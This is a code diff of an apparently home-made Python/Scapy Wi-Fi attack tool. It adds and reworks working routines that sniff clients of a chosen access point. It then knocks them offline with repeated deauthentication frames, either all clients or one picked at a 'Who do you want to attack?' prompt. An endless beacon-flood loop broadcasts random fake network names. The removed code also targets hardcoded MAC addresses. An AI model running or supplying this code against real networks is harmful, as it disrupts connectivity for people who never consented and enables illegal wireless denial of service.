@@ -228,10 +228,8 @@ class Frame_Snatcher():
         c3 = "bold blue"
         c4 = "bold green"
 
-
-
-
-
+        
+      
         # THIS IS STRICTLY USED TO CAPTURE BEACON FRAMES // SENT FROM AP'S
         if pkt.haslayer(Dot11Beacon):
 
@@ -255,7 +253,7 @@ class Frame_Snatcher():
 
 
 
-             
+            
 
             if addr1 not in cls.macs and addr1 != "No":
                 
@@ -268,7 +266,7 @@ class Frame_Snatcher():
 
                 # NOW TO OUTPUT RESULTS
                 console.print(f"[{c2}][+] Found a new mac addr1:[{c4}] {addr1}")
- 
+
 
 
             # BEACON == AP FRAMES ONLY           
@@ -293,6 +291,7 @@ class Frame_Snatcher():
 
         # DESTROY ERRORS
         verbose = True
+        cls.SNIFF = True
 
         
         # CREATE A CLIENT LIST
@@ -305,7 +304,8 @@ class Frame_Snatcher():
             
 
             # BEGIN THE SNIFF
-            sniff(iface=iface, prn=parse_for_clients, count=0, store=0), #timeout=timeout)
+            while cls.SNIFF:
+                sniff(iface=iface, prn=parse_for_clients, count=0, store=0, timeout=2) #timeout=timeout)
         
             console.print("\n -----  SNIFF ENDED  ----- ", style="bold red")
 
@@ -314,43 +314,47 @@ class Frame_Snatcher():
         def parse_for_clients(pkt):
             """This will be used to parse for clients"""
 
+
+
+            # CHECK IF YOUR ALLOWED TO BE ALIVE
+            if cls.SNIFF:
             
 
-            # FILTER FOR WIFI FRAMES
-            if pkt.haslayer(Dot11):
+                # FILTER FOR WIFI FRAMES
+                if pkt.haslayer(Dot11):
 
 
-                # ADDR VARS
-                addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
-                addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False
- 
-                
-                # VALID CLIENTS ONLY
-                if addr1 == target or addr2 == target:
+                    # ADDR VARS
+                    addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
+                    addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False
+    
+                    
+                    # VALID CLIENTS ONLY
+                    if addr1 == target or addr2 == target:
+
+                        
+                        
+                        # ADDR1
+                        if addr1 != target and addr1 not in cls.clients and addr1:
+
+
+                            # ADD TO LIST
+                            cls.clients.append(addr1)
+
+                            if verbose:
+                                console.print(f"Client: {addr1} --> {target}")
 
                     
-                    
-                    # ADDR1
-                    if addr1 != target and addr1 not in cls.clients and addr1:
+    
+                        # ADDR2
+                        elif addr2 != target and addr2 not in cls.clients and addr2:
 
 
-                        # ADD TO LIST
-                        cls.clients.append(addr1)
+                            # ADD TO LIST
+                            cls.clients.append(addr2)
 
-                        if verbose:
-                            console.print(f"Client: {addr1} --> {target}")
-
-                   
-   
-                    # ADDR2
-                    elif addr2 != target and addr2 not in cls.clients and addr2:
-
-
-                        # ADD TO LIST
-                        cls.clients.append(addr2)
-
-                        if verbose:
-                            console.print(f"Client: {addr2} --> {target}")
+                            if verbose:
+                                console.print(f"Client: {addr2} --> {target}")
 
 
 
@@ -363,7 +367,7 @@ class Frame_Snatcher():
         time.sleep(10)
 
         # LOOP THIS BITCH
-        while True:
+        while cls.SNIFF:
             
             # RESET CLIENT LIST
             cls.clients = []
@@ -372,7 +376,7 @@ class Frame_Snatcher():
 
 
     @classmethod
-    def target_chooser(cls):
+    def target_chooser(cls, type):
         """In this method the user will choose which target they want to attack"""
 
        
@@ -435,7 +439,7 @@ class Frame_Snatcher():
                 
                 # RETURN TO MODULE MAIN METHOD
                 Utilities.clear_screen()
-                Frame_Snatcher.main(skip=True)
+                Frame_Snatcher.main(skip=True, type=type)
 
 
             elif choice in [0, "no", "n", "nope", "nah"]:
@@ -535,6 +539,248 @@ class Frame_Snatcher():
 
                     console.print("Alright ur done for", style="bold red")
                     break
+    
+
+    @classmethod
+    def client_chooser(cls, target, iface, verbose=0):
+        """This method will be responsible for grabbing the single client on the target <-- TYPE 1"""
+
+        
+        # VARS
+        clients = []
+        clients_info = []
+        verbose = True
+
+
+        # CREATE TABLE
+        table = Table(title="Client List", title_style="bold red", style="bold purple", border_style="purple", header_style="bold red")
+        table.add_column("#")
+        table.add_column("MAC Addr", style="bold blue")
+        table.add_column("-->", style="bold red")
+        table.add_column("AP", style="bold green")
+        table.add_column("Vendor", style="bold yellow")
+
+
+        
+        # SNIFF FOR CLIENTS FIRST
+        def small_deauth():
+            """Send a deauth packet and sniff the reconnected macs"""
+
+            sent = 0
+
+
+            # DELAY WAIT FOR SNIFF
+            time.sleep(3)
+
+
+            # FUNCTION
+            while sent < 10:
+
+                # RANDOMIZE THE DEAUTH
+                reasons = random.choice([4,5,7,15])
+                
+                # CRAFT THE FRAME
+                frame = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target, addr3=target) / Dot11Deauth(reason=reasons)
+                
+
+                # SEND THE FRAME
+                sendp(frame, iface=iface, verbose=False)
+
+
+                # WAIT
+                time.sleep(1)
+
+
+                # GO
+                sent += 1
+
+                if verbose:
+                    console.print(f"Deauth --> {target}  -  Reason: {reasons}", style="bold red")
+
+
+        def client_sniffer(pkt):
+            """This will sniff client macs connected to the target"""
+
+            
+            # CATCH
+            try:
+
+                # FILTER FOR DOT11 FRAMES
+                if pkt.haslayer(Dot11):
+
+                    
+                    # COLLECT ADDR1 & ADDR2
+                    addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
+                    addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False
+
+                    
+
+                    # CHECK FOR TARGET
+                    if addr1 == target or addr2 == target:
+
+                        
+
+                        # ADDR1
+                        if addr1 != target and addr1 not in clients and addr1:
+
+
+                            # GET VENDOR
+                            vendor = Utilities.get_vendor(mac=addr1)
+                            
+                            # APPEND TO LIST
+                            clients.append(addr1)
+
+                            # FOR INFO
+                            clients_info.append((addr2, vendor))
+
+
+                            # ADD DATA TO TABLE
+                            table.add_row(f"{len(clients)}", f"{addr1}", " --> ", f"{target}", f"{vendor}")
+
+                        
+                        
+                        # ADDR2
+                        elif addr2 != target and addr2 not in clients and addr2:
+
+
+                            # GET VENDOR
+                            vendor = Utilities.get_vendor(mac=addr2)
+
+                            
+                            # APPEND TO LIST
+                            clients.append(addr2)
+
+                            # FOR INFO
+                            clients_info.append((addr2, vendor))
+
+
+                            # ADD DATA TO TABLE
+                            table.add_row(f"{len(clients)}", f"{addr2}", " --> ", f"{target}", f"{vendor}")
+
+
+
+            # BREAK
+            except KeyboardInterrupt as e:
+                console.print(f"[bold red]YOU ESCAPED THE MATRIX:[yellow] {e}")                
+            
+            
+            # ERROR
+            except Exception as e:
+                console.print(f"[bold red]Exception Error:[yellow] {e}")
+
+
+    
+
+        # START A BACKGROUND THREAD
+        threading.Thread(target=small_deauth, daemon=True).start()
+
+
+        # SNIFF RESULTS
+        #sniffed = 0
+        #while sniffed < 60:
+        console.print("\nI will now begin to sniff for clients for the next 60 seconds if you want to stop earlier press ctrl + c!\n", style="bold red")
+        time.sleep(2)
+
+        # SNIFF
+        with Live(table, console=console, refresh_per_second=2):
+            sniff(iface=cls.iface, prn=client_sniffer, store=0, count=0, timeout=60)
+        
+
+        
+        data = {}
+        num = 0
+        error = False
+        for client in clients:
+
+            # NUM
+            num += 1
+
+            # ADD DATA
+            data[num] = client
+        
+        console.print(data)
+
+        # DESTROY ERRORS
+        while True:
+            try:
+                
+                
+                # FOR CLEANER OUTPUT
+                if error:
+                    console.print(f"\n[bold red]Enter a key[bold red] 1 - {num},[bold green] to choose your target!")
+                    error = False 
+
+
+                # USER CHOOSES THERE TARGET
+                choice = console.input(f"[bold red]Who do you want to attack?: ").strip()
+
+                # INT IT 
+                choice = int(choice)
+
+
+
+                if choice in range(1, num) or choice == num:
+                    target = data[choice]
+
+
+                    console.print(f"\n[bold red]Target choosen:[yellow] {target}")
+
+                    
+                    # RETURN THE TARGET
+                    return target
+                
+                
+
+                # OUTSIDE OF NUM
+                else:
+                    error = True
+                    
+            
+            
+
+            # DIDNT ENTER A KEY VALUE (INTEGER)
+            except KeyError as e:
+                
+                if verbose:
+                    console.print(e)
+
+
+                error = True
+
+            
+
+            # DIDNT ENTER A KEY VALUE (INTEGER)
+            except TypeError as e:
+
+                if verbose:
+                    console.print(e)
+
+
+                error = True
+            
+
+        
+            
+            # ELSE
+            except Exception as e:
+
+                if verbose:
+
+                    console.print(f"[bold red]Exception Error:[yellow] {e}")
+
+                
+                if error == False:
+                    error = 1
+                
+                elif error:
+                    error += 1
+                
+
+                # SAFETY CATCH
+                if error == 4:
+
+                    console.print("Alright ur done for", style="bold red")
+                    break
 
 
     @classmethod
@@ -545,6 +791,10 @@ class Frame_Snatcher():
         # VARS
         packets_sent = 0
         error = 0
+
+
+        # NOW TO TRACK THE AMOUNT OF CLIENTS ON THE AP
+        threading.Thread(target=Frame_Snatcher.track_clients, args=(target, cls.iface), daemon=True).start()
 
         
         # BEGINNING OF THE END
@@ -560,7 +810,7 @@ class Frame_Snatcher():
 
         # CREATE LIVE PANEL
         down = 5
-        panel = Panel(renderable=f"Launching Attack in {down}", style="bold purple", border_style="bold red", expand=False, title="Attack Status")
+        panel = Panel(renderable=f"Launching Attack in {down}", style="bold yellow", border_style="bold red", expand=False, title="Attack Status")
 
 
 
@@ -578,10 +828,13 @@ class Frame_Snatcher():
                 
                 # NOW FOR THE ACTUAL DELAY LOL
                 time.sleep(1)
+            
 
+            # USE THIS VARIABLE TO BREAK NESTED LOOP
+            STAY = True
             
             # NOW FOR THE ATTACK
-            while True:
+            while STAY:
                 try:
 
 
@@ -605,7 +858,8 @@ class Frame_Snatcher():
 
                     panel.renderable = (
                         f"[{c1}]Target:[/{c1}] {target}  -  " 
-                        f"[{c1}]Total Packets Sent:[/{c1}] {packets_sent}  -"  
+                        f"[{c1}]Client:[/{c1}] {client}  -  " 
+                        f"[{c1}]Total Packets Sent:[/{c1}] {packets_sent}  -  "  
                         f"[{c1}]Reason:[/{c1}] {reasons}  -  "  
                         f"[{c1}]Clients:[/{c1}] {len(cls.clients)}"
 
@@ -617,7 +871,21 @@ class Frame_Snatcher():
                 except KeyboardInterrupt as e:
                     console.print(e)
 
-                    break
+                    
+                    # WAIT
+                    while STAY:
+                        try:
+                            console.print(f"Cleaning up", style="bold red")
+                            time.sleep(3)
+
+                            STAY = False       # BREAK NESTED LOOP
+                            cls.SNIFF = False  # KILL BACKGROUND THREAD 
+                        
+
+                        except KeyboardInterrupt as e:
+                            console.print("STOP PRESSING ctrl + c", style="bold red")
+                        
+
                 
 
                 except Exception as e:
@@ -630,11 +898,14 @@ class Frame_Snatcher():
                     else:
                         
                         console.print("[bold red]Max Amount of Errors Given!")
-                        break
+
+
+                        STAY = False       # BREAK NESTED LOOP
+                        cls.SNIFF = False  # KILL BACKGROUND THREAD
                     
     
     @classmethod
-    def main(cls, skip=False):
+    def main(cls, type, skip=False):
         """This is where the module will spawn from"""
 
 
@@ -665,22 +936,37 @@ class Frame_Snatcher():
 
 
             # ALLOW THE USER TO CHOOSE THERE TARGET
-            target = Frame_Snatcher.target_chooser()
+            target = Frame_Snatcher.target_chooser(type=type)
 
 
             # NOW TO TRACK THE AMOUNT OF CLIENTS ON THE AP
-            threading.Thread(target=Frame_Snatcher.track_clients, args=(target, cls.iface), daemon=True).start()
+            # threading.Thread(target=Frame_Snatcher.track_clients, args=(target, cls.iface), daemon=True).start()
 
 
-            # NOW TO ATTACK THE TARGET
-            Frame_Snatcher.target_attacker(target=target, iface=cls.iface)   
+            # ALL CLIENT ATTACK
+            if type == 2:
+
+                # ATTACK ALL CLIENTS ON TARGET
+                Frame_Snatcher.target_attacker(target=target, iface=cls.iface)   
+            
+
+            # SINGLE CLIENT 
+            elif type == 1:
+
+                # SNAG CLIENT
+                client = Frame_Snatcher.client_chooser(target=target, iface=cls.iface)
+                
+                # NOW ATTACK CLIENT ON TARGET
+                Frame_Snatcher.target_attacker(target=target, client=client, iface=cls.iface)
+
 
         
+
         except KeyboardInterrupt as e:
             console.print(e)
 
         
-        #
+        # DESTROY YOU
         except Exception as e:
             console.print(f'[bold red]Exception Error:[yellow] {e}')   
 
@@ -690,151 +976,72 @@ class Frame_Snatcher():
             # END
             console.print("\n\nThank you for trying out my program", style="bold red") 
 
-        time.sleep(3)
+            time.sleep(1.5)
 
 
 
 
 
 class Beacon_Flooder():
-    """This class will be responsible for performing beacon attacks and maybe Probe flooding """
+    """This class will be responsible for creating and flooding fake APs to nearby devices"""
 
-
-
+    
     def __init__(self):
         pass
 
 
 
     @classmethod
-    def beacon_packet(cls):
-        """Create the beacon packet"""
+    def get_ssid(cls):
+        """This method will create a ssid"""
 
 
-        # VARS
-        num = 0
-        ssids = [
-            "I AM NOT REAL",
-            "HOWDY HOW ARE YOU DOING",
-            "TESTING WPA ACCESS",
-            "THIS IS FOR UR SAFETY",
-            "HEY HEY HEY",
-            "DUDE DUE DUE"
-        ]
-
-        
-        while num < 5:
-
-
-            # GET A RANDOM MAC
-            mac = RandMAC()
-            ssid = random.choice(ssids)
-
-
-            frame = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac) / Dot11Beacon(cap="ESS+privacy") / Dot11Elt(ID="SSID", info=ssid)
-
-
-            sendp(frame, inter=0.1, count=1, iface="wlan1")
-
-            num += 1
-        
+        pass
 
     
-
-class Deauth_You():
-    """This module will be responsible for crafting and sending deauth packets"""
-
-    # CLASS VARS
-    captures = {}
+    @classmethod
+    def get_bssid(cls):
+        """This method will create a bssid"""
 
 
-
-    def __init__(self):
         pass
 
 
-
-    @classmethod
-    def death_all(cls, client_mac, ap_mac, iface="wlan0", verbose=1, inter=0, packets=500):
-        """This method will be used to send deauth frames to any and all devices found within the area"""
-
-        
-        try:
-
-            # CREATE THE DEAUTH FRAME
-            reasons = random.choice([7,4,5,15])
-            dot11 = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)  # ADDR1 = RECIEVER ADDR2 = SENDER, ADDR3 = REAL AP
-            frame = RadioTap() / dot11 / Dot11Deauth(reason=reasons)  # REASON = THE REASON THERE BEING KICKED OFF
-
-
-            # NOW TO SEND THE FRAME
-            console.print(ap_mac)
-            
-            if ap_mac.strip() == "aa:95:dd:e8:c5:53":
-
-                
-                loop = 1
-
-                while loop <= 100: 
-
-                    # RECREATE FRAME
-                    reasons = random.choice([7,4,5,15])
-                    frame = RadioTap() / dot11 / Dot11Deauth(reason=reasons) / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
-
-                    sendp(frame, iface=iface, verbose=verbose, inter=0.1, count=25)
-
-                    console.print(f"Performing Targeted Deauth #{loop}", style="bold green")
-
-                    loop += 1
-            
-            else:
-
-               # while loop < 30:
-                sendp(frame, iface=iface, verbose=verbose, inter=inter, count=packets)
-
-                   # loop += 1
-    
-
-            console.print(f"Frames Successfully sent", style="bold green")
-        
-        
-        except OSError as e:
-            console.print(f"[bold red]Deauth OS Error:[yellow] {e}")
-
-
-        except Exception as e:
-            console.print(f"[bold red]Exception Error:[yellow] {e}")
-
     
     @classmethod
-    def packet_parser(cls, pkt, type=2):
-        "This method is responsible for crafting the actual deauth packets"
+    def get_frames(cls, amount, client="ff:ff:ff:ff:ff:ff"):
+        """This method will create the frame"""
+
+
+        # VAR
+        frames = []
+        
+        while amount >= 0:
+
+
+            # GET SSID 
+            ssid = Beacon_Flooder.get_ssid()
+
+            # GET BSSID
+            bssid = Beacon_Flooder.get_bssid()
+
+
+            # CRAFT FRAME
+            frame = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Beacon(cap="ESS") / Dot11Elt(ID="ssid", info=ssid)
+
+
+            # APPEND AND GO
+            frames.append(frame)
+
+            amount -= 1
 
         
-        # YOUR MONITOR MODE INTERFACE
-        iface = 'wlan1mon'
-        
+        # NOW RETURN THE LIST OF FRAMES
+        return frames
+    
+   
+    
 
-        # COLORS
-        c1 = "bold red"
-        c2 = "bold green"
-        c3 = "bold blue"
-        c4 = "bold yellow"
-        
-
-        # CHECK IF ITS A DOT11 PACKET
-        if type == 1:
-            if pkt.haslayer(Dot11):
-                console.print(f"[{c1}][+] Packet:[{c2}] {pkt.addr1} [{c4}]--> [{c2}] {pkt.addr2}")
-        
-
-        # FOR BEACON FRAMES
-        elif type == 2:
-            if pkt.haslayer(Dot11Beacon):
-                
-
-                if pkt.addr2 == "3E:6E:B6:08:E3:1F":
-                    console.print(f"Iphone found: {pkt.addr2}", style="bold green")
 
 
 
@@ -969,7 +1176,7 @@ class You_Cant_DOS_ME():
 if __name__ == "__main__":
     
 
-    use = 2
+    use = 1
 
 
     if use == 1:
@@ -985,7 +1192,40 @@ if __name__ == "__main__":
     elif use == 3:
 
 
-        Beacon_Flooder.beacon_packet()
+        #Beacon_Flooder.beacon_packet()
 
 
 
+        from scapy.all import *
+        import random
+        import string
+        import time
+
+        iface = "wlan0"  # Set to your monitor-mode interface
+
+        def random_mac():
+            return "02:%02x:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(6))
+
+        def random_ssid(length=8):
+            return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+
+        def create_beacon(ssid, bssid):
+            dot11 = Dot11(type=0, subtype=8,
+                        addr1="ff:ff:ff:ff:ff:ff",
+                        addr2=bssid,
+                        addr3=bssid)
+            beacon = Dot11Beacon(cap="ESS")
+            essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
+            pkt = RadioTap()/dot11/beacon/essid
+            return pkt
+
+        while True:
+            pkts = []
+            for _ in range(30):  # generate 5 SSIDs
+                ssid = random_ssid(random.randint(6, 12))
+                bssid = random_mac()
+                pkt = create_beacon(ssid, bssid)
+                pkts.append(pkt)
+
+            sendp(pkts, iface=iface, verbose=0)
+            time.sleep(0.1)  # small delay to keep from overwhelming your adapter
